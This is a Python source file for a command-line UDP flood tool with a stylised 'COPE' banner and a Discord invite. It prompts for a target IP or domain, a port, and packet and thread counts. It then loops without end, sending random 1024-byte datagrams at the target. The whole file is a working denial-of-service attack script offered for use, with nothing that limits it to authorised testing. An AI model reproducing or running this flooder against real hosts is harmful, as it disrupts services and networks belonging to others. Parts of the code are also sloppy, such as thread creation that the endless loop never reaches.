import os
import random
import sys
import socket
import threading
import ipaddress
import time

# Terminal temizleme işlemi
os.system('clear' if os.name == 'posix' else 'cls')

    # Renkli metin oluşturma fonksiyonu
def colored_text(text, color):
        RESET = '\033[0m'
        return f"{color}{text}{RESET}"

    # Mor-pembe gradyan oluşturma fonksiyonu
def mor_pembe_gradyan(text):
        gradient_text = ""
        for char_index, char in enumerate(text):
            mor_value = 128 + char_index * 127 // len(text)
            pembe_value = char_index * 255 // len(text)
            gradient_text += f"\033[38;2;{mor_value};0;{pembe_value}m{char}"
        return gradient_text

# IPv4 adresi doğrulama fonksiyonu
def is_valid_ipv4(ip):
    try:
        ipaddress.IPv4Address(ip)
        return True
    except ipaddress.AddressValueError:
        return False

# Paket gönderme fonksiyonu
def run(ip_run, port_run, times_run, threads_run):
    data_run = random._urandom(1024)
    try:
        while True:
            print(mor_pembe_gradyan(" " * 50) + mor_pembe_gradyan(f"[$] Packet sent to {ip_run}:{port_run}"))
            s_run = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr_run = (str(ip_run), int(port_run))
            for x_run in range(times_run):
                s_run.sendto(data_run, addr_run)
            s_run.close()
    except KeyboardInterrupt:
        print("\n" + mor_pembe_gradyan(" " * 50) + mor_pembe_gradyan("\033[1;31m[!]\033[0m \033[1;37mScript terminated by user (Ctrl+C). Exiting.\033[0m"))
        sys.exit(0)
    except Exception as e:
        sys.exit(mor_pembe_gradyan("\033[1;31m[!]\033[0m ") + mor_pembe_gradyan(f"\033[1;37m{e}\033[0m") + ".")

# Başlangıç metni
text = mor_pembe_gradyan("""
                                                ▄████▄   ▒█████   ██▓███  ▓█████ 
                                                ▒██▀ ▀█  ▒██▒  ██▒▓██░  ██▒▓█   ▀ 
                                                ▒▓█    ▄ ▒██░  ██▒▓██░ ██▓▒▒███   
                                                ▒▓▓▄ ▄██▒▒██   ██░▒██▄█▓▒ ▒▒▓█  ▄ 
                                                ▒ ▓███▀ ░░ ████▓▒░▒██▒ ░  ░░▒████▒
                                                ░ ░▒ ▒  ░░ ▒░▒░▒░ ▒▓▒░ ░  ░░░ ▒░ ░
                                                  ░  ▒     ░ ▒ ▒░ ░▒ ░      ░ ░  ░
                                                ░        ░ ░ ░ ▒  ░░          ░   
                                                ░ ░          ░ ░              ░  ░
                                                ░                                 
                                                   
                         
                                        >Author: cope                 >Version: 1.0.1B
""")

# Çizgi ve veri satırı metinleri
line1 = mor_pembe_gradyan("""
-----------------------------------------------------------------------------------------------------------------------
""")
datas = mor_pembe_gradyan("""
                                                 >Also Join Our Discord!
                                             https://discord.gg/SmTMv5Qd87
""")
line2 = mor_pembe_gradyan("""
-----------------------------------------------------------------------------------------------------------------------
""")

# "1.0.2A" ve "Weaky" değerlerinin sarıya dönüştürülmesi
datas = datas.replace("1.0.2A", colored_text("1.0.2A", '\033[95m')).replace("Weaky", colored_text("Weaky", '\033[95m')).replace("https://github.com/weakyi/zyron", colored_text("https://github.com/weakyi/zyron", '\033[95m'))

# Tüm metinlerin yazdırılması
print(text)
print(line1)
time.sleep(0.000000000000000000000000001)
print(datas)
print(line2)

# Ana fonksiyon
def main():
    while True:
        try:
            target = input(mor_pembe_gradyan("Enter IP or domain--> "))
            if target.strip() and (is_valid_ipv4(target) or not target.replace('.', '').isdigit()):
                break
            else:
                print(mor_pembe_gradyan("Invalid input. Please enter a valid target IP or domain."))
        except KeyboardInterrupt:
            print(mor_pembe_gradyan("Script terminated by user (Ctrl+C). Exiting."))
            sys.exit(0)
            
    if not is_valid_ipv4(target):
        try:
            ip = socket.gethostbyname(target)
            print(mor_pembe_gradyan(f"[$] Resolved {target} to {ip}"))
        except socket.error as e:
            print(mor_pembe_gradyan("Error resolving the target: {}".format(e)))
            sys.exit(1)
    else:
        ip = target

    while True:
        try:
            port = int(input(mor_pembe_gradyan("Enter port-->  ")))
            break
        except ValueError:
            print(mor_pembe_gradyan("Invalid input. Please enter a valid integer for the port."))
        except KeyboardInterrupt:
            print(mor_pembe_gradyan("Script terminated by user (Ctrl+C). Exiting."))
            sys.exit(0)

    while True:
        try:
            times_input = input(mor_pembe_gradyan("Enter packets per connection-->  "))
            if times_input.strip():  
                times = int(times_input)
                break
            else:
                print(mor_pembe_gradyan("Invalid input. Please enter a valid integer for the packets."))
        except ValueError:
            print(mor_pembe_gradyan("Invalid input. Please enter a valid integer for the packets."))
        except KeyboardInterrupt:
            print(mor_pembe_gradyan("Script terminated by user (Ctrl+C). Exiting."))
            sys.exit(0)

    while True:
        try:
            threads_input = input(mor_pembe_gradyan("Enter threads-->  "))
            if threads_input.strip():
                threads = int(threads_input)
                break
            else:
                print(mor_pembe_gradyan("Invalid input. Please enter a valid integer for the threads."))
        except ValueError:
            print(mor_pembe_gradyan("Invalid input. Please enter a valid integer for the threads."))
        except KeyboardInterrupt:
            print(mor_pembe_gradyan("Script closed by user, Exiting."))
            sys.exit(0)

    data = random._urandom(1024)
    i = random.choice((mor_pembe_gradyan("\033[1;31m\033[0m"), mor_pembe_gradyan("\033[1;31m[!]\033[0m"), mor_pembe_gradyan("\033[1;31m\033[0m")))
    error_occurred = False
    
    try:
        while True:
            print(mor_pembe_gradyan("[$] Packet sent to ") + mor_pembe_gradyan(f"{ip}") + mor_pembe_gradyan(":") + mor_pembe_gradyan(f"{port}"))
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            for x in range(times):
                s.sendto(data, addr)
            s.close()

    except KeyboardInterrupt:
        print(mor_pembe_gradyan("Script closed by user, Exiting."))
        sys.exit(0)

    except OSError as e:
        if not error_occurred:
            error_occurred = True
            print(mor_pembe_gradyan("[!]") + mor_pembe_gradyan(f" {e}") + ".")
            sys.exit()

    for y in range(threads):
        th = threading.Thread(target=run, args=(ip, port, times, threads))
        th.start()

if __name__ == "__main__":
    main()